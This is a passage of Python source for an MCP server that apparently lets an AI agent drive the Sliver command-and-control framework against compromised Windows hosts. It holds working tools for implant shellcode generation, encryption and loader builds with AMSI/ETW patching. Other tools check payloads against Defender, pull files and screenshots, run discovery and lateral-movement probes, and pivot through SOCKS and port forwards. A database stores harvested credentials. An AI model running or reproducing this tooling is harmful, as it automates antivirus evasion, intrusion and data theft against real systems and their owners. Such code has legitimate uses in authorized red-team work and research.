        return json.dumps(rows, indent=2)
    except Exception as e:
        return _format_tool_error("sliver_ps", e, session_id=session_id)


@mcp.tool()
async def sliver_netstat(
    session_id: str,
    tcp: bool = True,
    udp: bool = True,
    listening: bool = True,
) -> str:
    """Show network connections on the remote system.

    Args:
        session_id: Target session ID.
        tcp: Include TCP connections. Default true.
        udp: Include UDP connections. Default true.
        listening: Include listening ports. Default true.
    """
    try:
        session = await _interact(session_id)
        entries = await session.netstat(
            tcp=tcp, udp=udp, ipv4=True, ipv6=True, listening=listening
        )
        if not entries:
            return "No network connections returned."
        rows = []
        for e in entries:
            local = getattr(e.LocalAddr, "Ip", "") + ":" + str(getattr(e.LocalAddr, "Port", ""))
            remote = getattr(e.RemoteAddr, "Ip", "") + ":" + str(getattr(e.RemoteAddr, "Port", ""))
            rows.append(
                {
                    "protocol": e.Protocol,
                    "local_address": local,
                    "remote_address": remote,
                    "state": getattr(e, "SkState", ""),
                    "pid": getattr(e, "Pid", 0),
                }
            )
        return json.dumps(rows, indent=2)
    except Exception as e:
        return f"netstat failed on session {session_id}: {e}"


@mcp.tool()
async def sliver_ifconfig(session_id: str) -> str:
    """Show network interface configuration on the remote system.

    Args:
        session_id: Target session ID.
    """
    try:
        session = await _interact(session_id)
        result = await session.ifconfig()
        if not result.NetInterfaces:
            return "No network interfaces returned."
        rows = []
        for iface in result.NetInterfaces:
            addrs = []
            if hasattr(iface, "IPAddresses"):
                addrs = list(iface.IPAddresses)
            rows.append(
                {
                    "index": iface.Index,
                    "name": iface.Name,
                    "mac": iface.MAC,
                    "ip_addresses": addrs,
                    "mtu": getattr(iface, "MTU", 0),
                }
            )
        return json.dumps(rows, indent=2)
    except Exception as e:
        return f"ifconfig failed on session {session_id}: {e}"


@mcp.tool()
async def sliver_upload(
    session_id: str,
    remote_path: str,
    local_path: str,
) -> str:
    """Upload a file from the operator machine to the remote target.

    Args:
        session_id: Target session ID.
        remote_path: Destination path on the target system.
        local_path: Source file path on the operator machine.
    """
    try:
        data = Path(local_path).read_bytes()
        session = await _interact(session_id)
        result = await session.upload(remote_path, data)
        return f"Uploaded {len(data)} bytes to {remote_path} on session {session_id}."
    except FileNotFoundError:
        return f"Local file not found: {local_path}"
    except Exception as e:
        return f"Upload failed on session {session_id}: {e}"


@mcp.tool()
async def sliver_download(
    session_id: str,
    remote_path: str,
    save_to: str = "",
) -> str:
    """Download a file from the remote target.

    Args:
        session_id: Target session ID.
        remote_path: File path on the target to download.
        save_to: Local path to save the file. If empty, returns base64-encoded content.
    """
    try:
        session = await _interact(session_id)
        result = await session.download(remote_path)
        data = result.Data
        if not data:
            return f"Downloaded empty file from {remote_path}."
        if save_to:
            Path(save_to).write_bytes(data)
            return f"Downloaded {len(data)} bytes from {remote_path} to {save_to}."
        encoded = base64.b64encode(data).decode("ascii")
        if len(encoded) > 10000:
            return (
                f"Downloaded {len(data)} bytes from {remote_path}. "
                f"File too large to display. Call again with save_to parameter."
            )
        return f"Downloaded {len(data)} bytes from {remote_path}:\n[base64]\n{encoded}"
    except Exception as e:
        return f"Download failed on session {session_id}: {e}"


@mcp.tool()
async def sliver_screenshot(session_id: str, save_to: str = "/tmp/screenshot.png") -> str:
    """Take a screenshot of the remote system's desktop.

    Args:
        session_id: Target session ID.
        save_to: Local path to save the PNG screenshot. Default: /tmp/screenshot.png.
    """
    try:
        session = await _interact(session_id)
        result = await session.screenshot()
        data = result.Data
        if not data:
            return "Screenshot returned empty data (no active desktop?)."
        Path(save_to).write_bytes(data)
        return f"Screenshot saved to {save_to} ({len(data)} bytes)."
    except Exception as e:
        return f"Screenshot failed on session {session_id}: {e}"


@mcp.tool()
async def sliver_rm(
    session_id: str,
    remote_path: str,
    recursive: bool = False,
    force: bool = False,
) -> str:
    """Delete a file or directory on the remote system.

    Args:
        session_id: Target session ID.
        remote_path: Path to delete on the target.
        recursive: Recursively delete directories. Default false.
        force: Force deletion. Default false.
    """
    try:
        session = await _interact(session_id)
        await session.rm(remote_path, recursive=recursive, force=force)
        return f"Removed {remote_path} on session {session_id}."
    except Exception as e:
        return f"rm failed on session {session_id}: {e}"


@mcp.tool()
async def sliver_mkdir(session_id: str, remote_path: str) -> str:
    """Create a directory on the remote system.

    Args:
        session_id: Target session ID.
        remote_path: Directory path to create on the target.
    """
    try:
        session = await _interact(session_id)
        result = await session.mkdir(remote_path)
        return f"Created directory: {result.Path}"
    except Exception as e:
        return f"mkdir failed on session {session_id}: {e}"


# =========================================================================
#  EVASION PIPELINE TOOLS
# =========================================================================


@mcp.tool()
async def sliver_encrypt_shellcode(
    shellcode_path: str,
    output_dir: str = "",
) -> str:
    """Encrypt raw Sliver shellcode with AES-256-CBC using the project's encrypt_shellcode.py.

    Args:
        shellcode_path: Path to the raw shellcode .bin file (e.g. /tmp/implant.bin).
        output_dir: Output directory for payload.enc + crypto_keys.nim. Defaults to evasion/.
    """
    if not output_dir:
        output_dir = EVASION_DIR
    script = f"{EVASION_DIR}/encrypt_shellcode.py"
    await _run_cmd(["sed", "-i", r"s/\r//", script])
    rc, stdout, stderr = await _run_cmd(
        ["python3", script, shellcode_path, output_dir],
        cwd=EVASION_DIR,
    )
    if rc != 0:
        return f"Encryption failed (exit {rc}):\n{stderr}\n{stdout}"
    return json.dumps(
        {
            "status": "encrypted",
            "payload_enc": f"{output_dir}/payload.enc",
            "crypto_keys_nim": f"{output_dir}/crypto_keys.nim",
            "keys_reference": f"{output_dir}/keys_reference.txt",
            "output": stdout.strip(),
        },
        indent=2,
    )


@mcp.tool()
async def sliver_build_loaders(
    callback_ip: str,
    payload_url: str = "",
    keys_dir: str = "",
    enable_patches: bool = False,
) -> str:
    """Compile Nim evasion loaders (remote + local) using the project's build.sh.

    Requires crypto_keys.nim to exist in the evasion directory (from sliver_encrypt_shellcode).

    Args:
        callback_ip: Your C2 callback IP address.
        payload_url: HTTPS URL for the remote loader to fetch payload.enc. Default: https://<callback_ip>:443/font.woff.
        keys_dir: Directory containing crypto_keys.nim to copy into evasion/. If empty, assumes it is already there.
        enable_patches: Enable AMSI/ETW patches in the loader. Default false (not needed for shellcode).
    """
    if keys_dir:
        src = f"{keys_dir}/crypto_keys.nim"
        dst = f"{EVASION_DIR}/crypto_keys.nim"
        cp_rc, _, cp_err = await _run_cmd(["cp", src, dst])
        if cp_rc != 0:
            return f"Failed to copy crypto_keys.nim: {cp_err}"

    # Fix Windows line endings on scripts living in a NTFS-mounted dir
    for script_name in ["build.sh", "encrypt_shellcode.py"]:
        await _run_cmd(["sed", "-i", r"s/\r//", f"{EVASION_DIR}/{script_name}"])

    env_prefix = ["env", "ENABLE_PATCHES=1"] if enable_patches else []
    build_cmd = env_prefix + ["bash", f"{EVASION_DIR}/build.sh", callback_ip]
    if payload_url:
        build_cmd.append(payload_url)

    rc, stdout, stderr = await _run_cmd(build_cmd, cwd=EVASION_DIR, timeout=600)
    if rc != 0:
        return f"Build failed (exit {rc}):\n{stderr}\n{stdout}"
    return json.dumps(
        {
            "status": "built",
            "remote_loader": f"{EVASION_DIR}/loader_remote.exe",
            "local_loader": f"{EVASION_DIR}/loader_local.exe",
            "callback_ip": callback_ip,
            "payload_url": payload_url or f"https://{callback_ip}:443/payload.enc",
            "output": stdout.strip()[-500:],
        },
        indent=2,
    )


@mcp.tool()
async def sliver_evasion_pipeline(
    c2_url: str,
    callback_ip: str,
    host_label: str = "target1",
    payload_url: str = "",
) -> str:
    """End-to-end evasion pipeline: generate shellcode -> encrypt -> build loaders.

    Automates the full payload generation workflow in one call.

    Args:
        c2_url: C2 callback URL for implant generation (e.g. 'https://10.0.0.1:443' or 'dns://10.0.0.1').
        callback_ip: Your callback IP for the loader build.
        host_label: Label for output subdirectory (e.g. 'target1', 'dc01'). Default: target1.
        payload_url: Custom payload URL for remote loader. Optional.
    """
    steps: list[dict[str, Any]] = []
    sc_path = f"/tmp/{host_label}.bin"
    out_dir = f"{EVASION_DIR}/{host_label}"

    # Step 1: Generate shellcode via Sliver gRPC
    gen_result = await sliver_generate(
        c2_url=c2_url, save_path=sc_path, output_format="shellcode"
    )
    steps.append({"step": "generate_shellcode", "result": gen_result})
    if "Failed" in gen_result:
        return json.dumps({"status": "failed", "failed_at": "generate", "steps": steps}, indent=2)

    # Step 2: Create output dir
    await _run_cmd(["mkdir", "-p", out_dir])

    # Step 3: Encrypt shellcode
    enc_result = await sliver_encrypt_shellcode(
        shellcode_path=sc_path, output_dir=out_dir
    )
    steps.append({"step": "encrypt_shellcode", "result": enc_result})
    if "failed" in enc_result.lower():
        return json.dumps({"status": "failed", "failed_at": "encrypt", "steps": steps}, indent=2)

    # Step 4: Build loaders
    build_result = await sliver_build_loaders(
        callback_ip=callback_ip,
        payload_url=payload_url,
        keys_dir=out_dir,
        enable_patches=False,
    )
    steps.append({"step": "build_loaders", "result": build_result})
    if "failed" in build_result.lower():
        return json.dumps({"status": "failed", "failed_at": "build", "steps": steps}, indent=2)

    # Step 5: Rename outputs for this target label
    rename_cmds = [
        ["mv", f"{EVASION_DIR}/loader_remote.exe", f"{EVASION_DIR}/{host_label}_remote.exe"],
        ["mv", f"{EVASION_DIR}/loader_local.exe", f"{EVASION_DIR}/{host_label}_local.exe"],
    ]
    for cmd in rename_cmds:
        rc, _, err = await _run_cmd(cmd)
        if rc != 0:
            steps.append({"step": "rename", "error": err})

    return json.dumps(
        {
            "status": "complete",
            "host_label": host_label,
            "shellcode": sc_path,
            "payload_enc": f"{out_dir}/payload.enc",
            "remote_loader": f"{EVASION_DIR}/{host_label}_remote.exe",
            "local_loader": f"{EVASION_DIR}/{host_label}_local.exe",
            "steps": steps,
        },
        indent=2,
    )


@mcp.tool()
async def sliver_preflight_defender(file_path: str) -> str:
    """Run a Windows Defender scan on a file to check if it gets flagged before deployment.

    Args:
        file_path: Windows file path to scan (e.g. 'C:\\Users\\Public\\loader.exe').
    """
    mpcmdrun = r"C:\Program Files\Windows Defender\MpCmdRun.exe"
    try:
        rc, stdout, stderr = await _run_cmd(
            [mpcmdrun, "-Scan", "-ScanType", "3", "-File", file_path],
            timeout=120,
        )
        if rc == 2:
            return json.dumps(
                {"status": "DETECTED", "file": file_path, "detail": stdout.strip()},
                indent=2,
            )
        return json.dumps(
            {"status": "CLEAN", "file": file_path, "detail": stdout.strip()},
            indent=2,
        )
    except FileNotFoundError:
        return "MpCmdRun.exe not found. This tool must be run from Windows, not WSL."
    except Exception as e:
        return f"Preflight scan failed: {e}"


# =========================================================================
#  POST-EXPLOITATION WORKFLOW TOOLS
# =========================================================================

_DISCOVERY_COMMANDS: list[tuple[str, str, list[str]]] = [
    ("User Context", "whoami", ["/all"]),
    ("Hostname", "hostname", []),
    ("System Info", "systeminfo", []),
    ("Network Config", "ipconfig", ["/all"]),
    ("ARP Table", "arp", ["-a"]),
    ("Active Connections", "netstat", ["-ano"]),
    ("Local Users", "net", ["user"]),
    ("Local Administrators", "net", ["localgroup", "administrators"]),
    ("Shares", "net", ["share"]),
    ("Domain Info", "net", ["view", "/domain"]),
    ("Running Processes", "tasklist", ["/v"]),
    ("Scheduled Tasks", "schtasks", ["/query", "/fo", "LIST"]),
]


@mcp.tool()
async def sliver_discovery(session_id: str) -> str:
    """Run a comprehensive discovery suite on a target via a Sliver session.

    Executes whoami, systeminfo, ipconfig, arp, netstat, net user, tasklist, etc.
    individually through the implant (no files dropped on target). Returns structured
    JSON with a summary dict (hostname, domain, IPs, user, is_admin, OS) at the top
    and auto-logs the target and findings to the state database.

    Args:
        session_id: Target session ID.
    """
    sections: dict[str, str] = {}
    errors: dict[str, str] = {}
    for label, exe, args in _DISCOVERY_COMMANDS:
        try:
            output = await _exec_on_session(session_id, exe, args)
            sections[label] = output if output else "(no output)"
        except Exception as e:
            sections[label] = f"(error: {e})"
            errors[label] = str(e)

    summary = _build_discovery_summary(sections)
    state_actions: dict[str, Any] = {}
    try:
        if summary.get("hostname"):
            state_actions = _log_discovery_to_state(
                session_id, summary, "sliver_discovery"
            )
    except Exception as exc:
        state_actions = {"error": str(exc)}

    return _json_out({
        "session_id": session_id,
        "summary": summary,
        "sections": sections,
        "errors": errors or None,
        "state_db": state_actions,
    })


@mcp.tool()
async def sliver_lateral_check(session_id: str, target_ip: str) -> str:
    """Test lateral movement reachability from one compromised host to a target IP.

    Runs ping, SMB share enum, admin share access check, and port connectivity
    tests (RDP 3389, SMB 445, WinRM 5985) through the session.

    Args:
        session_id: Source session ID (the host you are pivoting FROM).
        target_ip: IP address of the target host to test reachability to.
    """
    import ipaddress as _ipaddress
    try:
        target_ip = target_ip.strip()
        _ipaddress.ip_address(target_ip)
    except ValueError:
        return _format_tool_error(
            "sliver_lateral_check",
            ValueError(f"Invalid target IP: {target_ip!r}. Must be a valid IPv4/IPv6 address."),
            session_id=session_id,
        )

    checks: dict[str, str] = {}

    tests: list[tuple[str, str, list[str]]] = [
        ("Ping", "ping", ["-n", "2", target_ip]),
        ("SMB Share Enum", "net", ["view", f"\\\\{target_ip}"]),
        ("Admin Share C$", "cmd.exe", ["/c", f"dir \\\\{target_ip}\\C$"]),
        ("IPC$ Connection", "net", ["use", f"\\\\{target_ip}\\IPC$"]),
        ("Port 3389 (RDP)", "powershell.exe", [
            "-Command",
            f"(Test-NetConnection -ComputerName {target_ip} -Port 3389 -WarningAction SilentlyContinue).TcpTestSucceeded"
        ]),
        ("Port 445 (SMB)", "powershell.exe", [
            "-Command",
            f"(Test-NetConnection -ComputerName {target_ip} -Port 445 -WarningAction SilentlyContinue).TcpTestSucceeded"
        ]),
        ("Port 5985 (WinRM)", "powershell.exe", [
            "-Command",
            f"(Test-NetConnection -ComputerName {target_ip} -Port 5985 -WarningAction SilentlyContinue).TcpTestSucceeded"
        ]),
    ]

    for label, exe, args in tests:
        try:
            output = await _exec_on_session(session_id, exe, args)
            checks[label] = output.strip() if output else "(no output)"
        except Exception as e:
            checks[label] = f"(error: {e})"

    # Clean up IPC$ if it connected
    try:
        await _exec_on_session(session_id, "net", ["use", f"\\\\{target_ip}\\IPC$", "/delete"])
    except Exception:
        pass

    summary = _summarize_lateral_check(checks, target_ip)
    return _json_out({
        "source_session": session_id,
        "target_ip": target_ip,
        "summary": summary,
        "checks": checks,
    })


@mcp.tool()
async def sliver_collect_evidence(
    session_id: str,
    evidence_dir: str = "",
    files_to_download: str = "",
) -> str:
    """Collect evidence from a session: screenshot, session metadata, and optional file downloads.

    Automatically logs the target and a discovery finding to the state database.

    Args:
        session_id: Target session ID.
        evidence_dir: Local dir to save evidence. Default: $SLIVER_EVIDENCE_DIR/<session_id>.
        files_to_download: Comma-separated remote file paths to download from target. Optional.
    """
    if not evidence_dir:
        evidence_dir = f"{EVIDENCE_DIR}/{session_id[:8]}"
    await _run_cmd(["mkdir", "-p", evidence_dir])

    collected: list[str] = []
    failures: list[dict[str, str]] = []
    session_info: dict[str, Any] | None = None

    # Session info
    client = await _get_client()
    sessions = await client.sessions()
    for s in sessions:
        if s.ID == session_id:
            session_info = _session_object_to_dict(s)
            break
    if session_info:
        info_path = f"{evidence_dir}/session_info.json"
        Path(info_path).write_text(_json_out(session_info))
        collected.append(info_path)
    else:
        failures.append({
            "step": "session_info",
            "error": f"Session {session_id} not found in active sessions.",
        })

    # Screenshot
    try:
        ss_path = f"{evidence_dir}/screenshot.png"
        session = await _interact(session_id)
        result = await session.screenshot()
        if result.Data:
            Path(ss_path).write_bytes(result.Data)
            collected.append(ss_path)
    except Exception as e:
        failures.append({"step": "screenshot", "error": str(e)})

    # Discovery snapshot
    discovery_summary: dict[str, Any] = {}
    try:
        discovery_sections: dict[str, str] = {}
        for label, exe, args in _DISCOVERY_COMMANDS:
            try:
                output = await _exec_on_session(session_id, exe, args)
                discovery_sections[label] = output if output else "(no output)"
            except Exception as exc:
                discovery_sections[label] = f"(error: {exc})"
        discovery_summary = _build_discovery_summary(discovery_sections)
        disc_path = f"{evidence_dir}/discovery.json"
        Path(disc_path).write_text(_json_out({
            "summary": discovery_summary,
            "sections": discovery_sections,
        }))
        collected.append(disc_path)
    except Exception as e:
        failures.append({"step": "discovery", "error": str(e)})

    # Download requested files
    if files_to_download:
        for remote_path in [p.strip() for p in files_to_download.split(",") if p.strip()]:
            try:
                session = await _interact(session_id)
                result = await session.download(remote_path)
                if result.Data:
                    safe_name = remote_path.replace("\\", "_").replace("/", "_").replace(":", "")
                    local_path = f"{evidence_dir}/{safe_name}"
                    Path(local_path).write_bytes(result.Data)
                    collected.append(local_path)
            except Exception as e:
                failures.append({"step": f"download:{remote_path}", "error": str(e)})

    state_actions: dict[str, Any] = {}
    try:
        if discovery_summary.get("hostname"):
            state_actions = _log_discovery_to_state(
                session_id, discovery_summary, "sliver_collect_evidence"
            )
            state_actions["evidence_finding_id"] = _state_add_finding_sync(
                title=f"Evidence collected on {discovery_summary['hostname']}",
                severity="info",
                description=f"Evidence saved to {evidence_dir}. Files: {len(collected)}.",
                evidence_path=evidence_dir,
                target_hostname=discovery_summary["hostname"],
            )
        elif session_info and session_info.get("hostname"):
            state_actions["target"] = _state_upsert_target(
                hostname=session_info["hostname"],
                ip=_extract_ip_from_remote_address(session_info.get("remote_address", "")),
                os=f"{session_info.get('os', '')}/{session_info.get('arch', '')}",
                access_level=_infer_access_level(session_info.get("username", "")),
                notes="Auto-registered during evidence collection",
            )
    except Exception as exc:
        state_actions = {"error": str(exc)}

    return _json_out({
        "status": "collected" if collected else "partial",
        "evidence_dir": evidence_dir,
        "session": session_info,
        "summary": discovery_summary or None,
        "files": collected,
        "failures": failures or None,
        "state_db": state_actions,
    })


# =========================================================================
#  PIVOTING TOOLS
# =========================================================================


@mcp.tool()
async def sliver_socks_start(session_id: str) -> str:
    """Start a SOCKS5 proxy through a Sliver session for pivoting.

    Args:
        session_id: Session ID to tunnel traffic through.
    """
    try:
        client = await _get_client()
        result = await client.socks5_start(session_id)
        return json.dumps(
            {
                "status": "started",
                "session_id": session_id,
                "tunnel_id": getattr(result, "TunnelID", ""),
                "note": "Configure proxychains or browser to use the SOCKS5 proxy.",
            },
            indent=2,
        )
    except Exception as e:
        return _format_tool_error("sliver_socks_start", e, session_id=session_id)


@mcp.tool()
async def sliver_socks_stop(session_id: str) -> str:
    """Stop a SOCKS5 proxy running through a session.

    Args:
        session_id: Session ID to stop the proxy on.
    """
    try:
        client = await _get_client()
        await client.socks5_stop(session_id)
        return f"SOCKS5 proxy stopped on session {session_id}."
    except Exception as e:
        return f"Failed to stop SOCKS5 proxy on session {session_id}: {e}"


@mcp.tool()
async def sliver_portfwd_add(
    session_id: str,
    remote_host: str,
    remote_port: int,
    bind_host: str = "127.0.0.1",
    bind_port: int = 0,
) -> str:
    """Add a port forward through a Sliver session.

    Args:
        session_id: Session ID to create the tunnel through.
        remote_host: Target host IP accessible from the compromised system.
        remote_port: Target port to forward (e.g. 3389 for RDP).
        bind_host: Local address to bind the forward. Default: 127.0.0.1.
        bind_port: Local port to bind. Default: 0 (auto-assign).
    """
    try:
        session = await _interact(session_id)
        result = await session.portfwd_add(
            remote_host=remote_host,
            remote_port=remote_port,
            bind_host=bind_host,
            bind_port=bind_port,
        )
        return json.dumps(
            {
                "status": "created",
                "bind": f"{bind_host}:{getattr(result, 'BindPort', bind_port)}",
                "remote": f"{remote_host}:{remote_port}",
                "session_id": session_id,
                "port_fwd_id": getattr(result, "ID", ""),
            },
            indent=2,
        )
    except Exception as e:
        return f"Port forward failed: {e}"


@mcp.tool()
async def sliver_portfwd_list(session_id: str) -> str:
    """List active port forwards on a session.

    Args:
        session_id: Session ID to list forwards for.
    """
    try:
        session = await _interact(session_id)
        result = await session.portfwd_list()
        fwds = getattr(result, "Forwarders", [])
        if not fwds:
            return "No active port forwards."
        rows = []
        for f in fwds:
            rows.append({
                "id": getattr(f, "ID", ""),
                "bind": f"{getattr(f, 'BindHost', '')}:{getattr(f, 'BindPort', '')}",
                "remote": f"{getattr(f, 'RemoteHost', '')}:{getattr(f, 'RemotePort', '')}",
            })
        return json.dumps(rows, indent=2)
    except Exception as e:
        return f"Failed to list port forwards: {e}"


@mcp.tool()
async def sliver_portfwd_rm(session_id: str, port_fwd_id: int) -> str:
    """Remove a port forward from a session.

    Args:
        session_id: Session ID the forward is on.
        port_fwd_id: ID of the port forward to remove (from sliver_portfwd_list).
    """
    try:
        session = await _interact(session_id)
        await session.portfwd_rm(port_fwd_id)
        return f"Port forward {port_fwd_id} removed from session {session_id}."
    except Exception as e:
        return f"Failed to remove port forward: {e}"


# =========================================================================
#  ENGAGEMENT STATE DATABASE
# =========================================================================

_state_db: sqlite3.Connection | None = None


def _get_state_db() -> sqlite3.Connection:
    """Return (and lazily create) the engagement state SQLite connection."""
    global _state_db
    if _state_db is not None:
        return _state_db
    db_path = STATE_DB_PATH
    _state_db = sqlite3.connect(db_path, check_same_thread=False)
    _state_db.row_factory = sqlite3.Row
    _state_db.execute("PRAGMA journal_mode=WAL")
    _state_db.executescript("""
        CREATE TABLE IF NOT EXISTS targets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            hostname TEXT,
            ip TEXT,
            os TEXT,
            domain TEXT,
            access_level TEXT DEFAULT 'none',
            notes TEXT DEFAULT '',
            created_at TEXT DEFAULT (datetime('now')),
            updated_at TEXT DEFAULT (datetime('now'))
        );
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            secret TEXT,
            domain TEXT DEFAULT '',
            cred_type TEXT DEFAULT 'plaintext',
            source TEXT DEFAULT '',
            target_id INTEGER,
            created_at TEXT DEFAULT (datetime('now')),
            FOREIGN KEY (target_id) REFERENCES targets(id)
        );
        CREATE TABLE IF NOT EXISTS access_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT,
            target_id INTEGER,
            method TEXT DEFAULT '',
            status TEXT DEFAULT 'active',
            timestamp TEXT DEFAULT (datetime('now')),
            FOREIGN KEY (target_id) REFERENCES targets(id)
        );
        CREATE TABLE IF NOT EXISTS findings (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            title TEXT,
            severity TEXT DEFAULT 'info',
            description TEXT DEFAULT '',
            evidence_path TEXT DEFAULT '',
            target_id INTEGER,
            created_at TEXT DEFAULT (datetime('now')),
            FOREIGN KEY (target_id) REFERENCES targets(id)
        );
        CREATE TABLE IF NOT EXISTS pivot_paths (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            source_target_id INTEGER,
            dest_target_id INTEGER,
            method TEXT DEFAULT '',
            status TEXT DEFAULT 'planned',
            created_at TEXT DEFAULT (datetime('now')),
            FOREIGN KEY (source_target_id) REFERENCES targets(id),
            FOREIGN KEY (dest_target_id) REFERENCES targets(id)
        );
    """)
    _state_db.commit()
    return _state_db


def _state_upsert_target(
    hostname: str,
    ip: str = "",
    os: str = "",
    domain: str = "",
    access_level: str = "none",
    notes: str = "",
) -> dict[str, Any]:
    """Insert or update a target in the state DB. Returns action metadata."""
    if not hostname:
        return {"action": "skipped", "reason": "empty hostname"}
    db = _get_state_db()
    existing = db.execute(
        "SELECT id FROM targets WHERE hostname = ?", (hostname,)
    ).fetchone()
    if existing:
        db.execute(
            "UPDATE targets SET ip=COALESCE(NULLIF(?, ''), ip), "
            "os=COALESCE(NULLIF(?, ''), os), domain=COALESCE(NULLIF(?, ''), domain), "
            "access_level=?, notes=?, updated_at=datetime('now') WHERE id=?",
            (ip, os, domain, access_level, notes, existing["id"]),
        )
        db.commit()
        return {"action": "updated", "target_id": existing["id"], "hostname": hostname}
    cur = db.execute(
        "INSERT INTO targets (hostname, ip, os, domain, access_level, notes) "
        "VALUES (?, ?, ?, ?, ?, ?)",
        (hostname, ip, os, domain, access_level, notes),
    )
    db.commit()
    return {"action": "added", "target_id": cur.lastrowid, "hostname": hostname}


def _state_log_access_sync(
    session_id: str,
    target_hostname: str = "",
    method: str = "",
    status: str = "active",
) -> int:
    """Log an access event synchronously. Returns the new row id."""
    db = _get_state_db()
    target_id = None
    if target_hostname:
        row = db.execute(
            "SELECT id FROM targets WHERE hostname = ?", (target_hostname,)
        ).fetchone()
        if row:
            target_id = row["id"]
    cur = db.execute(
        "INSERT INTO access_log (session_id, target_id, method, status) "
        "VALUES (?, ?, ?, ?)",
        (session_id, target_id, method, status),
    )
    db.commit()
    return cur.lastrowid


def _state_add_finding_sync(
    title: str,
    severity: str = "info",
    description: str = "",
    evidence_path: str = "",
    target_hostname: str = "",
) -> int:
    """Log a finding synchronously. Returns the new row id."""
    db = _get_state_db()
    target_id = None
    if target_hostname:
        row = db.execute(
            "SELECT id FROM targets WHERE hostname = ?", (target_hostname,)
        ).fetchone()
        if row:
            target_id = row["id"]
    cur = db.execute(
        "INSERT INTO findings (title, severity, description, evidence_path, target_id) "
        "VALUES (?, ?, ?, ?, ?)",
        (title, severity, description, evidence_path, target_id),
    )
    db.commit()
    return cur.lastrowid


def _register_session_target(
    session_obj: Any,
    session_id: str,
    method: str = "session_discovered",
) -> dict[str, Any]:
    """Auto-register a session's host metadata in the state DB."""
    hostname = session_obj.Hostname or session_obj.Name or ""
    ip = _extract_ip_from_remote_address(getattr(session_obj, "RemoteAddress", "") or "")
    os_name = f"{session_obj.OS}/{session_obj.Arch}" if session_obj.OS else ""
    access = _infer_access_level(getattr(session_obj, "Username", "") or "")
    result = _state_upsert_target(
        hostname=hostname,
        ip=ip,
        os=os_name,
        access_level=access,
        notes=f"Auto-registered from session {session_id[:8]}",
    )
    if result.get("action") in ("added", "updated") and hostname:
        result["access_log_id"] = _state_log_access_sync(
            session_id, hostname, method, "active"
        )
    result["session_id"] = session_id
    return result


def _log_discovery_to_state(
    session_id: str,
    summary: dict[str, Any],
    source: str,
) -> dict[str, Any]:
    """Register target and discovery finding in the state DB."""
    actions: dict[str, Any] = {}
    hostname = summary.get("hostname", "")
    if not hostname:
        return {"skipped": True, "reason": "no hostname in summary"}
    actions["target"] = _state_upsert_target(
        hostname=hostname,
        ip=summary["ip_addresses"][0] if summary.get("ip_addresses") else "",
        os=f"{summary.get('os_name', '')} {summary.get('os_version', '')}".strip(),
        domain=summary.get("domain", ""),
        access_level=summary.get("access_level", "user"),
        notes=f"Auto-discovered via {source}",
    )
    actions["access_log_id"] = _state_log_access_sync(
        session_id, hostname, source, "active"
    )
    actions["finding_id"] = _state_add_finding_sync(
        title=f"Discovery on {hostname}",
        severity="info",
        description=_json_out(summary),
        target_hostname=hostname,
    )
    return actions


def _summarize_lateral_check(checks: dict[str, str], target_ip: str) -> dict[str, Any]:
    """Extract reachability summary from lateral movement check output."""
    ping_ok = "ttl=" in checks.get("Ping", "").lower() or "reply from" in checks.get("Ping", "").lower()
    smb_enum = checks.get("SMB Share Enum", "")
    admin_share = "access is denied" not in checks.get("Admin Share C$", "").lower()
    admin_share_ok = admin_share and "cannot find" not in checks.get("Admin Share C$", "").lower()
    ports: dict[str, bool] = {}
    for label in ("Port 3389 (RDP)", "Port 445 (SMB)", "Port 5985 (WinRM)"):
        val = checks.get(label, "").strip().lower()
        ports[label] = val == "true"
    return {
        "target_ip": target_ip,
        "reachable": ping_ok,
        "smb_shares_visible": "share name" in smb_enum.lower() or "\\\\" in smb_enum,
        "admin_share_accessible": admin_share_ok,
        "open_ports": {k: v for k, v in ports.items() if v},
        "lateral_options": [
            opt for opt, ok in [
                ("smb", ports.get("Port 445 (SMB)", False)),
                ("rdp", ports.get("Port 3389 (RDP)", False)),
                ("winrm", ports.get("Port 5985 (WinRM)", False)),
            ] if ok
        ],
    }


def _summarize_initial_recon(results: dict[str, str], opsec: dict[str, Any]) -> dict[str, Any]:
    """Build actionable summary from initial recon playbook output."""
    hostname = results.get("hostname", "").strip()
    sysinfo = _parse_systeminfo(results.get("systeminfo", ""))
    whoami = _parse_whoami(results.get("whoami", ""))
    ips = _parse_ipconfig(results.get("ipconfig", ""))
    proc_sample = results.get("processes_sample", "")
    proc_count = 0
    match = re.search(r"\((\d+) total\)", proc_sample)
    if match:
        proc_count = int(match.group(1))
    edr_products = [d["product"] for d in opsec.get("detected", [])]
    next_steps = ["Run sliver_playbook_privesc_check to assess privilege escalation paths."]
    if not opsec.get("safe", True):
        next_steps.insert(0, "EDR detected - review sliver_opsec_check before high-risk tools.")
    if whoami.get("is_admin"):
        next_steps.append("Admin context detected - consider credential harvesting and lateral movement.")
    return {
        "hostname": hostname or sysinfo.get("hostname", ""),
        "domain": whoami.get("domain") or sysinfo.get("domain", ""),
        "username": whoami.get("username", ""),
        "is_admin": whoami.get("is_admin", False),
        "os": sysinfo.get("os_name", ""),
        "ip_addresses": ips,
        "process_count": proc_count,
        "edr_detected": not opsec.get("safe", True),
        "edr_products": edr_products,
        "recommended_next_steps": next_steps,
    }


def _summarize_privesc(results: dict[str, str]) -> dict[str, Any]:
    """Build actionable summary from privesc playbook output."""
    priv_text = results.get("current_user", "")
    groups_text = results.get("groups", "")
    uac_text = results.get("uac_status", "")
    vectors: list[str] = []
    if "SeImpersonatePrivilege" in priv_text and "Enabled" in priv_text:
        vectors.append("SeImpersonatePrivilege enabled (Potato-style attacks)")
    if "SeAssignPrimaryTokenPrivilege" in priv_text and "Enabled" in priv_text:
        vectors.append("SeAssignPrimaryTokenPrivilege enabled")
    uac_enabled = "0x1" in uac_text or (
        "EnableLUA" in uac_text and "0x0" not in uac_text.split("REG_DWORD")[-1][:6]
    )
    always_install = (
        "0x1" in results.get("always_install_elevated_hklm", "")
        and "0x1" in results.get("always_install_elevated_hkcu", "")
    )
    if always_install:
        vectors.append("AlwaysInstallElevated set in HKLM and HKCU")
    unquoted_lines = [
        ln for ln in results.get("unquoted_services", "").splitlines()
        if ln.strip() and "Name" not in ln
    ]
    if unquoted_lines:
        vectors.append(f"{len(unquoted_lines)} potential unquoted service path(s)")
